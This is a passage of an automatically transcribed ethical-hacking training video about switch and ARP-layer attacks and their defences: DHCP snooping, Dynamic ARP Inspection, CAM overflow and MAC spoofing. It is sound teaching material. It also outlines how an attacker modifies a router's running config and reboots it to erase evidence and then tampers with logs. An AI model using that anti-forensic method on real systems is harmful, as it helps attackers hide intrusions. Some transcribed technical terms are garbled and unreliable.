that.\n\n483\n00:22:33.830 --> 00:22:38.680\nAnd obviously, some of those programs and\nconcerns would be of interest to us.\n\n484\n00:22:38.680 --> 00:22:41.960\nI mentioned DHCP snooping, just\na minute ago when we were talking about\n\n485\n00:22:41.960 --> 00:22:45.720\nsome things you could do on the Cisco\nswitch and on other switches.\n\n486\n00:22:45.720 --> 00:22:47.750\nDHCP snooping is kind of interesting,\n\n487\n00:22:47.750 --> 00:22:50.870\nthe concept is you can go in from\na security standpoint, right?\n\n488\n00:22:50.870 --> 00:22:54.300\nAnd we can look at the traffic and\nwe allow ourselves to\n\n489\n00:22:54.300 --> 00:22:57.970\nessentially have the switch act like\na firewall between the untrusted host and\n\n490\n00:22:57.970 --> 00:22:59.478\nthe trusted DHCP server.\n\n491\n00:22:59.478 --> 00:23:02.890\nWe're then gonna go ahead and validate all\nthe traffic and look at the messages, so\n\n492\n00:23:02.890 --> 00:23:06.490\nwe're not gonna propagate traffic\nthat is malformed or fragments or\n\n493\n00:23:06.490 --> 00:23:07.580\nanything like that.\n\n494\n00:23:07.580 --> 00:23:10.890\nWe're gonna rate limit the traffic\nfrom trusted to untrusted sources.\n\n495\n00:23:10.890 --> 00:23:14.590\nSo again, we're gonna control the flow\nto prevent broadcast propagation.\n\n496\n00:23:14.590 --> 00:23:18.140\nWe're gonna build and maintain what's\ncalled a snooping binding database,\n\n497\n00:23:18.140 --> 00:23:21.800\nthis has information about untrusted\nhosts with least IP addresses.\n\n498\n00:23:21.800 --> 00:23:25.300\nSo we can essentially do a little\naccess control lookup real quick and\n\n499\n00:23:25.300 --> 00:23:27.290\nmake sure we're not seeing\nany rogue activity.\n\n500\n00:23:27.290 --> 00:23:28.110\nAnd as a result of that,\n\n501\n00:23:28.110 --> 00:23:32.560\nwe'll validate those requests coming in\nfrom untrusted hosts as they look to bind.\n\n502\n00:23:32.560 --> 00:23:33.780\nAnd if we're not on the list,\n\n503\n00:23:33.780 --> 00:23:36.210\nwe're gonna treat you as\nessentially an attacker, right?\n\n504\n00:23:36.210 --> 00:23:37.600\nAnd we're not gonna let you through.\n\n505\n00:23:37.600 --> 00:23:40.022\nSo these are some of the things\nthat the HTTP snooping can do.\n\n506\n00:23:40.022 --> 00:23:41.720\nIt's an interesting concept.\n\n507\n00:23:41.720 --> 00:23:44.393\nYou have to be running technology\nplatforms that do support it.\n\n508\n00:23:44.393 --> 00:23:49.073\nSo, if you're setting up a virtual switch,\nhypothetically, the virtual switch,\n\n509\n00:23:49.073 --> 00:23:53.173\nif it's a Cisco switch, would support it,\nbut again, vendor by vendor.\n\n510\n00:23:53.173 --> 00:23:56.092\nThis technology exists, but\nit exists in different ways.\n\n511\n00:23:56.092 --> 00:23:58.663\nAnd is implemented in different\nways with different systems.\n\n512\n00:23:58.663 --> 00:24:00.160\nSo just be aware of that.\n\n513\n00:24:01.320 --> 00:24:04.230\nJust making sure that our little lab\nenvironment we have cooking there for\n\n514\n00:24:04.230 --> 00:24:07.390\nyou doesn't go offline before we\nget done with our conversation.\n\n515\n00:24:07.390 --> 00:24:10.840\nSo, just some things with the DHCP\nattacks you want to be aware of.\n\n516\n00:24:10.840 --> 00:24:15.310\nWe demonstrated an ARP attack in the prior\ndiscussion where we went through and\n\n517\n00:24:15.310 --> 00:24:17.800\nsaw how we could propagate\nthat ARP traffic.\n\n518\n00:24:17.800 --> 00:24:20.060\nSo, we know ARP,\nthe Address Resolution Protocol.\n\n519\n00:24:20.060 --> 00:24:24.420\nWe've talked about this, allows us to do\nIP address to MAC address resolution, and\n\n520\n00:24:24.420 --> 00:24:26.560\nMAC to IP if we do ARP or Reverse ARP.\n\n521\n00:24:26.560 --> 00:24:27.872\nI love saying RARP,\nit's so much fun, right?\n\n522\n00:24:27.872 --> 00:24:29.358\n&gt;&gt; It is fun.\n&gt;&gt; I always think of Astro, right?\n\n523\n00:24:29.358 --> 00:24:30.717\n&gt;&gt; [LAUGH]\n&gt;&gt; In the Jetsons?\n\n524\n00:24:30.717 --> 00:24:31.971\nRastro, Rarp.\n\n525\n00:24:31.971 --> 00:24:35.431\nI always think about that whenever\nI talk about ARP and RARP.\n\n526\n00:24:35.431 --> 00:24:36.389\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n527\n00:24:36.389 --> 00:24:38.763\nanother reference called that\nmany people probably don't get.\n\n528\n00:24:38.763 --> 00:24:39.761\n&gt;&gt; Probably not, but.\n\n529\n00:24:39.761 --> 00:24:41.340\n[CROSSTALK] They'll look it up and\nnow they'll know.\n\n530\n00:24:41.340 --> 00:24:41.934\n&gt;&gt; Now they'll know!\n\n531\n00:24:41.934 --> 00:24:44.130\nExactly, yeah, it's,\nthat's kinda cool, yeah,\n\n532\n00:24:44.130 --> 00:24:45.916\ncuz the Jetsons is like\na timeless cartoon.\n\n533\n00:24:45.916 --> 00:24:46.762\n&gt;&gt; It is.\n\n534\n00:24:46.762 --> 00:24:48.041\n&gt;&gt; I didn't like the movie very much.\n\n535\n00:24:48.041 --> 00:24:49.097\n&gt;&gt; I didn't even watch the movie.\n\n536\n00:24:49.097 --> 00:24:51.837\n&gt;&gt; The cartoons were just the old\nschool stuff was always good.\n\n537\n00:24:51.837 --> 00:24:53.335\n&gt;&gt; Yep.\n&gt;&gt; I didn't like the movie very much.\n\n538\n00:24:53.335 --> 00:24:56.870\nAll right anyway so our packet, Fred we\nknow that ARP attacks can be spoofed.\n\n539\n00:24:56.870 --> 00:24:59.200\nWe know as we demonstrated\nthat they can be sent and\n\n540\n00:24:59.200 --> 00:25:01.000\nthey can be used to get up to no good.\n\n541\n00:25:01.000 --> 00:25:03.270\nWe can use them to forge attacks.\n\n542\n00:25:03.270 --> 00:25:07.150\nI showed you how to use Cane to be able\nto launch in our poisoning attack.\n\n543\n00:25:07.150 --> 00:25:09.820\nAnd then we saw a demonstration,\ndata of that of the scale.\n\n544\n00:25:09.820 --> 00:25:12.286\nWe also saw data x ARP come up and\nnotify us, right?\n\n545\n00:25:12.286 --> 00:25:15.710\nIn the demo that that's happening, so\nwanna know that ARP spoofing attacks and\n\n546\n00:25:15.710 --> 00:25:17.860\npoison attacks can take place.\n\n547\n00:25:17.860 --> 00:25:19.208\nReference that discussion and\n\n548\n00:25:19.208 --> 00:25:21.858\nthe demo in the prior episode\nif you wanna see how it's done.\n\n549\n00:25:21.858 --> 00:25:25.521\nSo ARP spoofing can be an issue,\nARP poisoning can be an issue,\n\n550\n00:25:25.521 --> 00:25:30.158\nusing fake ARP messages, we could do\npacket-sniffing, session hijacking,\n\n551\n00:25:30.158 --> 00:25:33.780\ndata interception,\nconnection resets, steal passwords.\n\n552\n00:25:33.780 --> 00:25:35.760\nStop me when you hear\nsomething that sounds good.\n\n553\n00:25:35.760 --> 00:25:40.567\nAvoid call tapping, man in the middle\nattacks, denial, DOS, DDOS attacks,\n\n554\n00:25:40.567 --> 00:25:44.386\nsession hijacking and\nif I said that one, they may have array.\n\n555\n00:25:44.386 --> 00:25:47.532\nBut, we got us do all sorts of stuff\nthat really is just not great.\n\n556\n00:25:47.532 --> 00:25:50.227\n&gt;&gt; And ARP is a little bit or\nit leaves the door wide open for\n\n557\n00:25:50.227 --> 00:25:52.756\na lot of potential attacks\nif you're not careful.\n\n558\n00:25:52.756 --> 00:25:56.463\n&gt;&gt; It's an unrecognized protocol in\nthe sense we just take, essentially,\n\n559\n00:25:56.463 --> 00:25:59.950\ngranted and advantage of the fact\nthat this stuff just kind of works.\n\n560\n00:25:59.950 --> 00:26:00.840\nYou turn your machine on and boom,\n\n561\n00:26:00.840 --> 00:26:02.680\neverything is just kind of talking and\nwe're good.\n\n562\n00:26:02.680 --> 00:26:06.069\nWe don't really think about the way\nin which this stuff actually happens.\n\n563\n00:26:06.069 --> 00:26:06.766\n&gt;&gt; Mm-hm.\n\n564\n00:26:06.766 --> 00:26:12.069\n&gt;&gt; And these bedrock core protocols on\nthe networking stack, like ARP, like,\n\n565\n00:26:12.069 --> 00:26:17.047\nlooking at not just ARP but also,\nlooking at certainly MAC addresses and\n\n566\n00:26:17.047 --> 00:26:19.930\ntheir importance as we talked about.\n\n567\n00:26:19.930 --> 00:26:24.550\nLooking at multi-level stack behaviors,\nwe move up and down to translate,\n\n568\n00:26:24.550 --> 00:26:27.652\nand route, and\npackage data through the OSI model.\n\n569\n00:26:27.652 --> 00:26:31.930\nAnd the behavior of these protocols is\ncritical to our understanding of how to\n\n570\n00:26:31.930 --> 00:26:35.620\nbe successful, not only of attacking,\nthe hackers would wanna know but\n\n571\n00:26:35.620 --> 00:26:38.230\nalso to make sure that as\ndefenders we understand this.\n\n572\n00:26:38.230 --> 00:26:41.440\nBecause if we're not defending\nagainst our poisoning attacks and\n\n573\n00:26:41.440 --> 00:26:45.440\nour cache attacks, we could really get,\nunfortunately, a very nasty surprise.\n\n574\n00:26:45.440 --> 00:26:46.934\n&gt;&gt; Yeah.\n&gt;&gt; Somebody is gonna take our system\n\n575\n00:26:46.934 --> 00:26:47.527\naway from us.\n\n576\n00:26:47.527 --> 00:26:50.380\nWe also took a look at\nthe tool Prom Query.\n\n577\n00:26:50.380 --> 00:26:53.200\nRemember that allows us to go and\nlook in for promiscuous mode,\n\n578\n00:26:53.200 --> 00:26:55.460\nand whether a promiscuous mode is running.\n\n579\n00:26:55.460 --> 00:26:57.070\nSo we want to make sure\nthat we're aware of that.\n\n580\n00:26:57.070 --> 00:26:59.543\nDynamic ARP inspection or DARPI as I said.\n\n581\n00:26:59.543 --> 00:27:04.410\nDAI or as one of my colleagues once said,\nnot me but Dynamic ARP inspection,\n\n582\n00:27:04.410 --> 00:27:09.354\nanother technology from Cisco, among\nothers again that will be valuable for\n\n583\n00:27:09.354 --> 00:27:10.960\nyou to consider here.\n\n584\n00:27:10.960 --> 00:27:13.670\nIt will protect us against\nsome of these attacks.\n\n585\n00:27:13.670 --> 00:27:17.410\nThe idea here is that\nARP spoofing attacks and\n\n586\n00:27:17.410 --> 00:27:21.590\ncache poisoning attacks will be very\nproblematic and so as a result, this\n\n587\n00:27:21.590 --> 00:27:24.990\nsecurity feature allows us to validate our\npackets as they transit the network so\n\n588\n00:27:24.990 --> 00:27:27.260\nit's very important for\nus to think about this.\n\n589\n00:27:27.260 --> 00:27:28.560\nWe intercept, log and\n\n590\n00:27:28.560 --> 00:27:33.410\ndiscard our packets that have any\ninvalid IP to MAC address bindings.\n\n591\n00:27:33.410 --> 00:27:35.630\nSo it does prevent man in\nthe middle attacks, certainly,\n\n592\n00:27:35.630 --> 00:27:38.694\nand prevents those kinds of attacks\nthat may propagate that way.\n\n593\n00:27:38.694 --> 00:27:43.005\nSo it intercepts any and all ARP requests,\nlooks at them, maps them essentially,\n\n594\n00:27:43.005 --> 00:27:46.402\nexamines them and if we find them to\nnot be valid, we dump the traffic so\n\n595\n00:27:46.402 --> 00:27:47.780\nit never propagates past the switch or\n\n596\n00:27:47.780 --> 00:27:51.660\ndevice that's running DAI which is\nalso again pretty important for\n\n597\n00:27:51.660 --> 00:27:54.890\nus from a countermeasure\nperspective to understand this.\n\n598\n00:27:54.890 --> 00:27:56.350\nWe can do it on Cisco switches.\n\n599\n00:27:56.350 --> 00:28:00.180\nThere are equivalents of this technology\non other switches, you would have to go in\n\n600\n00:28:00.180 --> 00:28:02.796\nand of course make sure you\nunderstand how to enable it there.\n\n601\n00:28:02.796 --> 00:28:07.820\nAnd remember, even though this is\ngoing to be, even though those\n\n602\n00:28:07.820 --> 00:28:13.130\nare the gods of IP rumbling and\nnot happy with us cuz we are not talking\n\n603\n00:28:13.130 --> 00:28:17.550\nabout all of the different ways that we\ncan do this, just the Cisco specific way.\n\n604\n00:28:17.550 --> 00:28:20.930\nBut yeah what I was gonna say just\nquickly for those of you preparing for\n\n605\n00:28:20.930 --> 00:28:24.205\nthe CEH exam which I know\nseveral of you may want to do.\n\n606\n00:28:24.205 --> 00:28:28.195\nYou keep in mind, we're not gonna be\nvendor specific in a sense we're gonna go\n\n607\n00:28:28.195 --> 00:28:30.552\nin and say in this case,\nhey on a Cisco switch,\n\n608\n00:28:30.552 --> 00:28:34.784\nhow would you enable this four layers down\non the iOS and what's that whole series of\n\n609\n00:28:34.784 --> 00:28:38.808\ncommands that you'd have to enter to set\nup ports security or DAI or whatever?\n\n610\n00:28:38.808 --> 00:28:42.650\nOr how would you do it on another switch,\nright?\n\n611\n00:28:42.650 --> 00:28:44.659\nWhatever the other switch may\nbe that you're gonna look at.\n\n612\n00:28:44.659 --> 00:28:47.806\nWhat we're gonna ask about more often,\nmore traditionally, would be,\n\n613\n00:28:47.806 --> 00:28:49.190\nhey, what is that technology?\n\n614\n00:28:49.190 --> 00:28:51.999\nWhat is that security capability\nthat most switches or\n\n615\n00:28:51.999 --> 00:28:55.548\nit maybe even a Cisco switch would\npropagate and allow you to deploy.\n\n616\n00:28:55.548 --> 00:28:59.775\nThis is not a Cisco routing exam, in other\nwords, [LAUGH] is what I'm trying to say.\n\n617\n00:28:59.775 --> 00:29:02.525\nWhere you would be expected to\nunderstand how to do this and\n\n618\n00:29:02.525 --> 00:29:06.002\nyou would want to obviously understand\nthe commands associated with it.\n\n619\n00:29:06.002 --> 00:29:10.362\nYet this is more, are you familiar\nwith the fact that we can do it.\n\n620\n00:29:10.362 --> 00:29:14.237\nAnd from the switch config line,\nwe would go in and\n\n621\n00:29:14.237 --> 00:29:18.310\ndo IPDHCP snooping,\nIPDHCP snooping, set RVLAN.\n\n622\n00:29:18.310 --> 00:29:21.952\nAnd then show IPDHCP\nsnooping to see the config.\n\n623\n00:29:21.952 --> 00:29:22.842\nAnd we could configure it.\n\n624\n00:29:22.842 --> 00:29:24.652\nSame thing with ARP inspection, right?\n\n625\n00:29:24.652 --> 00:29:26.010\nIP ARP inspection.\n\n626\n00:29:26.010 --> 00:29:29.160\nSet the VLAN, and then, you know,\nlook at the config to understand it.\n\n627\n00:29:29.160 --> 00:29:33.752\nSo, we can go in, and\nshow the IP DHCP snooping, binding, and\n\n628\n00:29:33.752 --> 00:29:35.840\nuse those kind of commands.\n\n629\n00:29:35.840 --> 00:29:39.420\nBut we're not expecting you,\nI would say fairly, right,\n\n630\n00:29:39.420 --> 00:29:41.450\nto be as up on that as we\nwould be to understand.\n\n631\n00:29:41.450 --> 00:29:42.913\nAnd we've talked about\nthis in prior episodes.\n\n632\n00:29:42.913 --> 00:29:45.980\nI'm thinking in footprinting, in\nparticular where we talk about Nmap, and\n\n633\n00:29:45.980 --> 00:29:47.570\nsome of the switches with Nmap.\n\n634\n00:29:47.570 --> 00:29:50.470\nYou, as a matter of fact, specifically\njumped in and said hey, a lot of those\n\n635\n00:29:50.470 --> 00:29:53.420\nswitches are really important, and\nI think we put up a list of switches and\n\n636\n00:29:53.420 --> 00:29:56.540\na site where they can go to look for\nthem, if I remember correctly.\n\n637\n00:29:56.540 --> 00:29:59.540\nAnd so, we wanna make sure you're\ncomfortable with those kinda tools.\n\n638\n00:29:59.540 --> 00:30:03.610\nBut when it gets into vendor specificity\nand configuration of an interface,\n\n639\n00:30:03.610 --> 00:30:08.850\nI would not spend as much time on that,\nif I was you, as I would understanding\n\n640\n00:30:08.850 --> 00:30:13.290\nthe broader implications of the technology\nand how we counteract the attack and\n\n641\n00:30:13.290 --> 00:30:15.350\nwhat we would apply to do that,\nif that makes sense.\n\n642\n00:30:15.350 --> 00:30:18.170\nAnd I think that's just a general good\nrule of thumb when we're thinking\n\n643\n00:30:18.170 --> 00:30:19.730\nabout this kind of stuff, right?\n\n644\n00:30:19.730 --> 00:30:21.764\n&gt;&gt; Absolutely.\n&gt;&gt; All right we have spoofing attacks,\n\n645\n00:30:21.764 --> 00:30:24.260\nalso, that we've got to\ntalk a little bit about.\n\n646\n00:30:24.260 --> 00:30:27.010\nWe've talked about MAC spoofing,\nMAC address issues.\n\n647\n00:30:27.010 --> 00:30:28.810\nTalked about duplicating MAC addresses.\n\n648\n00:30:28.810 --> 00:30:31.560\n&gt;&gt; I did have one question that I thought\nabout when you were talking about MAC.\n\n649\n00:30:31.560 --> 00:30:33.850\nAnd you had said that\nthe switch fails open,\n\n650\n00:30:33.850 --> 00:30:37.070\nwhich means it basically turns into a hub,\nand starts broadcasting everything out,\n\n651\n00:30:37.070 --> 00:30:39.460\ncuz it can't keep track\nof who's at what port.\n\n652\n00:30:39.460 --> 00:30:43.429\nAnd it made me think of some of our\nsecurity doors, and how sometimes we have\n\n653\n00:30:43.429 --> 00:30:46.957\nto make a decision on whether this\ndoor fails open or fails closed.\n\n654\n00:30:46.957 --> 00:30:47.898\n&gt;&gt; Failsafe of fail secure.\n\n655\n00:30:47.898 --> 00:30:48.920\n&gt;&gt; Can we do that with switches?\n\n656\n00:30:48.920 --> 00:30:51.977\nIs it possible to say, you know what,\nrather than fail open and\n\n657\n00:30:51.977 --> 00:30:55.380\njust let all that traffic go everywhere\nand expose VLANs and all that,\n\n658\n00:30:55.380 --> 00:30:59.492\ncan we say look, we'll deal with the pain\nof not having networking and fail closed?\n\n659\n00:30:59.492 --> 00:31:01.234\n&gt;&gt; So, interesting question.\n\n660\n00:31:01.234 --> 00:31:02.360\nSo, two answers.\n\n661\n00:31:02.360 --> 00:31:04.833\nOne, in theory absolutely,\nshut off the switch.\n\n662\n00:31:04.833 --> 00:31:06.911\n&gt;&gt; [LAUGH]\n&gt;&gt; Always do that.\n\n663\n00:31:06.911 --> 00:31:09.315\nIt is a fail safe,\nfoolproof answer to any question.\n\n664\n00:31:09.315 --> 00:31:12.681\nIf it's not powered on, you're not worried\nabout anybody getting through it, so\n\n665\n00:31:12.681 --> 00:31:13.700\nlet's start with that.\n\n666\n00:31:13.700 --> 00:31:17.795\nSo there's always that option but Mike\nactually raises a really great question\n\n667\n00:31:17.795 --> 00:31:21.398\nwhich is, if we do know the potential\nof this kind of attack can occur,\n\n668\n00:31:21.398 --> 00:31:24.208\ncan we take steps either programmatically-\n&gt;&gt; [CROSSTALK]\n\n669\n00:31:24.208 --> 00:31:25.748\n&gt;&gt; Go in or something in the software\n\n670\n00:31:25.748 --> 00:31:26.355\ninterface.\n\n671\n00:31:26.355 --> 00:31:30.120\nWe could say were this could happen,\nbehave this way.\n\n672\n00:31:30.120 --> 00:31:33.330\nSo the problem with doing that would\nbe that we essentially are telling\n\n673\n00:31:33.330 --> 00:31:37.000\nthe switch, hey if you fill up and\nyou have no room left for\n\n674\n00:31:37.000 --> 00:31:39.230\nthe cam table or\nthe dynamic memory is full,\n\n675\n00:31:39.230 --> 00:31:42.260\nthis is essentially an error\ncondition in the switch, right.\n\n676\n00:31:42.260 --> 00:31:45.316\nSwitches are designed to be able to\ncontrol this information, write it and\n\n677\n00:31:45.316 --> 00:31:45.905\nwork with it.\n\n678\n00:31:45.905 --> 00:31:49.450\nSo you're telling the switch hey\nif you do this, this is a problem.\n\n679\n00:31:49.450 --> 00:31:53.709\nAnd it's tough to be able to specify that\nwe can do that successfully because it's\n\n680\n00:31:53.709 --> 00:31:54.830\nan error condition.\n\n681\n00:31:54.830 --> 00:31:56.063\nAnd with many error conditions,\n\n682\n00:31:56.063 --> 00:31:59.201\nwe don't really have control of when it's\ngonna happen under what circumstances.\n\n683\n00:31:59.201 --> 00:31:59.816\n&gt;&gt; Absolutely.\n\n684\n00:31:59.816 --> 00:32:04.040\n&gt;&gt; So We, in certain situations,\ncan not necessarily specify on the switch,\n\n685\n00:32:04.040 --> 00:32:07.870\nalthough we may be able to if there's\nan interface command for that.\n\n686\n00:32:07.870 --> 00:32:11.614\nI'm not up to date on all the latest\niOS information on CISCO.\n\n687\n00:32:11.614 --> 00:32:15.058\nThis actually would probably be a great\nquestion for somebody like Don or\n\n688\n00:32:15.058 --> 00:32:19.069\nRonnie or somebody who's actually working\non those platforms on a regular basis as I\n\n689\n00:32:19.069 --> 00:32:22.300\nknow because they do a lot of\nthose shows here at ITPro TV.\n\n690\n00:32:22.300 --> 00:32:25.200\nI'm not the go-to CISCO guy, specifically.\n\n691\n00:32:25.200 --> 00:32:29.010\nI understand the concepts and certainly\nwork in the technology platforms, but\n\n692\n00:32:29.010 --> 00:32:32.068\nI don't spend as much time in them as\nsomebody who will be doing it full-time.\n\n693\n00:32:32.068 --> 00:32:35.200\nSo I'll punt this one over the fence\nspecifically to say there may\n\n694\n00:32:35.200 --> 00:32:36.470\nbe support there.\n\n695\n00:32:36.470 --> 00:32:39.812\nBut what I was gonna say generically\nis that the other thing we can do, so\n\n696\n00:32:39.812 --> 00:32:43.456\nlet's come at it from a different\ndirection cuz then it's a great question.\n\n697\n00:32:43.456 --> 00:32:47.519\nIf we're monitoring the switch behavior\nand understand that the switch has failed\n\n698\n00:32:47.519 --> 00:32:50.025\nto open essentially,\nthen something like an IPS.\n\n699\n00:32:50.025 --> 00:32:54.897\nIf we bring in second, third, fourth\nlayer defense in-depth architecture and\n\n700\n00:32:54.897 --> 00:32:58.190\nwe think about how it takes\na village to raise a kid, and\n\n701\n00:32:58.190 --> 00:33:02.944\nit takes a security perimeter and multiple\nlayers of defense to truly defend.\n\n702\n00:33:02.944 --> 00:33:06.228\nIf we think about that and\nthat approach, we could have an IPS, and\n\n703\n00:33:06.228 --> 00:33:10.513\nI'm being specific here, and I'm saying an\nIPS cuz we want the reactive capabilities\n\n704\n00:33:10.513 --> 00:33:13.997\nas opposed to the IDS,\nsimply the monitoring capabilities, right?\n\n705\n00:33:13.997 --> 00:33:17.754\nSo if we had an IPS function that was\nmonitoring for these kinds of events,\n\n706\n00:33:17.754 --> 00:33:21.571\nusing SMTP traps, which we could\ntheoretically do and understand what's\n\n707\n00:33:21.571 --> 00:33:25.225\nhappening at the switch or other ways,\nthere's several ways to do it.\n\n708\n00:33:25.225 --> 00:33:29.122\nWe could take action to either\nperhaps power cycle the switch,\n\n709\n00:33:29.122 --> 00:33:31.703\nI wasn't kidding when I said shut it off.\n\n710\n00:33:31.703 --> 00:33:35.111\nBecause if you power cycle it,\nwe reset the buffer and\n\n711\n00:33:35.111 --> 00:33:38.840\nessentially we reclaim the buffer area for\nthe cam table.\n\n712\n00:33:38.840 --> 00:33:42.415\nWe wipe it out but then we would rebuild\nit but we may be able to stop the attack,\n\n713\n00:33:42.415 --> 00:33:43.406\nright, as a result.\n\n714\n00:33:43.406 --> 00:33:46.797\nSo we actually could take steps to\ndo that but I'm thinking it would be\n\n715\n00:33:46.797 --> 00:33:50.960\nsomething that we do outside of the\nhardware, how we're doing it separately.\n\n716\n00:33:50.960 --> 00:33:55.065\nThere may very well be a way to do that\non the switch depending on the support of\n\n717\n00:33:55.065 --> 00:33:56.360\nthe operating system.\n\n718\n00:33:56.360 --> 00:33:59.553\nBut as I said, I'm gonna differ to more\nknowledgeable people there because I\n\n719\n00:33:59.553 --> 00:34:01.618\ndon't wanna propagate\nthe wrong information and\n\n720\n00:34:01.618 --> 00:34:04.980\nsay definitively, just do it this way and\nit turns out not to be true.\n\n721\n00:34:04.980 --> 00:34:07.860\nBut I would be thinking just as\nan architect, I'd be thinking if I\n\n722\n00:34:07.860 --> 00:34:10.690\ncould do that, that's great, but\nI'd want a backup to that plan, right?\n\n723\n00:34:10.690 --> 00:34:14.085\nBecause malware or certain kinds\nof attacks may actually overwhelm\n\n724\n00:34:14.085 --> 00:34:16.500\nthe switches' ability\nexecute that command.\n\n725\n00:34:16.500 --> 00:34:19.613\nIf the buffer becomes full and\nthe switch fails, we may have an error\n\n726\n00:34:19.613 --> 00:34:23.327\ncondition that prevents the switch from\noperating correctly which would be what\n\n727\n00:34:23.327 --> 00:34:26.627\nI'm thinking, maybe a problem that\nwould prevent that from working.\n\n728\n00:34:26.627 --> 00:34:29.620\nI want another fail-safe mechanism behind\nthat so I'd wanna be monitoring and\n\n729\n00:34:29.620 --> 00:34:30.566\nlooking at it from that.\n\n730\n00:34:30.566 --> 00:34:33.376\n&gt;&gt; Cuz if it's already in an error state\nyou can't guarantee that it's gonna do\n\n731\n00:34:33.376 --> 00:34:34.036\nthe right thing.\n\n732\n00:34:34.036 --> 00:34:34.860\n&gt;&gt; [CROSSTALK] Execute it.\n\n733\n00:34:34.860 --> 00:34:35.486\n&gt;&gt; Yeah, exactly.\n\n734\n00:34:35.486 --> 00:34:37.863\n&gt;&gt; And, remember, we also when\nwe attack routers, for instance,\n\n735\n00:34:37.863 --> 00:34:40.600\none of the things we can do,\nwe do the same thing with switch.\n\n736\n00:34:40.600 --> 00:34:44.420\nWe do have the ability to, if we have\nthe right admin credential, access it and\n\n737\n00:34:44.420 --> 00:34:48.110\nchange the running config versus\nthe stored config on a router.\n\n738\n00:34:48.110 --> 00:34:51.770\nOne of the classic ways we can attack\nthese infrastructure items, and\n\n739\n00:34:51.770 --> 00:34:53.970\nif we modify the running config and\n\n740\n00:34:53.970 --> 00:34:57.720\nthen restart the system on our way out,\nwe wipe out evidence of the attack.\n\n741\n00:34:57.720 --> 00:34:59.568\nSo we can hack the router, right?\n\n742\n00:34:59.568 --> 00:35:01.950\nWe can essentially modify\nthe running config.\n\n743\n00:35:01.950 --> 00:35:05.970\nWe know the good stored config is there,\nit'll reload when we restart the system.\n\n744\n00:35:05.970 --> 00:35:10.860\nWe forensically wipe out any evidence of\nthe attack on our way out the door by\n\n745\n00:35:10.860 --> 00:35:12.264\ncycling the router.\n\n746\n00:35:12.264 --> 00:35:14.545\nThe only thing there of\ncourse would be the logs and\n\n747\n00:35:14.545 --> 00:35:17.638\nwe'd have to now trail that back to\na sem system, try to figure out,\n\n748\n00:35:17.638 --> 00:35:20.345\ncan we take that log and\nmodify that so there's no record?\n\n749\n00:35:20.345 --> 00:35:22.002\nAnd that gets into a lot of other stuff.\n\n750\n00:35:22.002 --> 00:35:25.085\nBut may we have a problem\nwith the switch as well.\n\n751\n00:35:25.085 --> 00:35:27.939\nIf the attack's smart enough, it knows\nthat we've programmed in this theoretical\n\n752\n00:35:27.939 --> 00:35:30.080\ncommand, whatever\nthe support command may be.\n\n753\n00:35:30.080 --> 00:35:31.930\nIt it exists, it'll let us do this.\n\n754\n00:35:31.930 --> 00:35:35.980\nIf a hacker knows that that exists, they\nmay go in and try to change the command\n\n755\n00:35:35.980 --> 00:35:38.760\non the switch before they propagate\nthe attack to know that, yeah,\n\n756\n00:35:38.760 --> 00:35:40.300\nif I do fail the switch,\n\n757\n00:35:40.300 --> 00:35:44.120\nnow that I've removed the safety that\nwould fail the switch closed, right?\n\n758\n00:35:44.120 --> 00:35:46.180\nEssentially now, I could fail it open.\n\n759\n00:35:46.180 --> 00:35:47.834\nBut they may not be able\nto get to the IPS and\n\n760\n00:35:47.834 --> 00:35:50.115\nthey may not realize we're\ndoing this at the IPS as well.\n\n761\n00:35:50.115 --> 00:35:53.042\nSo even it was there,\nI'd wanna build multiple layers and\n\n762\n00:35:53.042 --> 00:35:57.310\nmultiple picket lines to ensure that\nsomewhere along the way, it happens.\n\n763\n00:35:57.310 --> 00:36:00.874\nThought process being an attacker\nmay get one or two of my controls or\n\n764\n00:36:00.874 --> 00:36:03.513\nmy booby traps, but\nthey may not get all, right?\n\n765\n00:36:03.513 --> 00:36:06.685\nAnd so as a good ethical hacker,\nthinking along those lines,\n\n766\n00:36:06.685 --> 00:36:09.857\nI would be thinking, how many\nlayers of defense can I add in and\n\n767\n00:36:09.857 --> 00:36:12.250\nhow many places can I\nreplicate that control?\n\n768\n00:36:12.250 --> 00:36:13.408\n&gt;&gt; Awesome.\n&gt;&gt; Right, that's what I would be thinking,\n\n769\n00:36:13.408 --> 00:36:14.280\nanyway, if I was thinking about that.\n\n770\n00:36:14.280 --> 00:36:15.725\nIt's a good question, though.\n\n771\n00:36:15.725 --> 00:36:17.320\nGood question to think about.\n\n772\n00:36:17.320 --> 00:36:21.050\nAll right, so I was just gonna mention,\nwe just talked about MAC spoofing.\n\n773\n00:36:21.050 --> 00:36:25.570\nAnd we showed in the discussion as well\nhow we could go in and how we could either\n\n774\n00:36:25.570 --> 00:36:29.970\nmodify it using SMAC or MAC change or\nMAC address change, whatever.\n\n775\n00:36:29.970 --> 00:36:33.710\nI mentioned the fact that in Windows 8,\nin Windows 10, in the interface,\n\n776\n00:36:33.710 --> 00:36:36.940\nwe actually have the ability to go in and\nin the network card,\n\n777\n00:36:36.940 --> 00:36:39.160\nwe can program it on\nthe advance settings area.\n\n778\n00:36:39.160 --> 00:36:42.320\nWe can go in and actually add a value for\nthe MAC address.\n\n779\n00:36:42.320 --> 00:36:44.560\nI don't think we actually showed that.\n\n780\n00:36:44.560 --> 00:36:47.410\nBut we could go in,\njust give me a second, if you don't mind.\n\n781\n00:36:47.410 --> 00:36:50.230\nMaybe we can just have you narrate for\nhalf a second while I check the,\n\n782\n00:36:50.230 --> 00:36:52.420\nI just wanna go into the lab\nenvironment here and just bring it up,\n\n783\n00:36:52.420 --> 00:36:55.905\nI'm just not ready so bear with me here\njust half a second while I do that.\n\n784\n00:36:55.905 --> 00:36:59.166\nI'm just gonna go in real quick and\njust go to our actual real machine as\n\n785\n00:36:59.166 --> 00:37:01.839\noppose to the lab environment\nto bring up the interface.\n\n786\n00:37:01.839 --> 00:37:05.065\n&gt;&gt; [CROSSTALK] I think we pulled those\ntools up but we didn't actually-\n\n787\n00:37:05.065 --> 00:37:06.235\n&gt;&gt; It was Windows 7, so\n\n788\n00:37:06.235 --> 00:37:09.290\nI wanna actually go into\nthe Windows 10 machine here.\n\n789\n00:37:09.290 --> 00:37:11.212\nSo we're gonna do that right now,\nI'm just bringing it up.\n\n790\n00:37:11.212 --> 00:37:16.099\nAnd then if you give me just a second,\nonce I can find the right adapter, and\n\n791\n00:37:16.099 --> 00:37:17.896\nthere we go, right there.\n\n792\n00:37:17.896 --> 00:37:21.429\nAnd we're just gonna go in and\nlet me just see,\n\n793\n00:37:21.429 --> 00:37:26.060\nactually 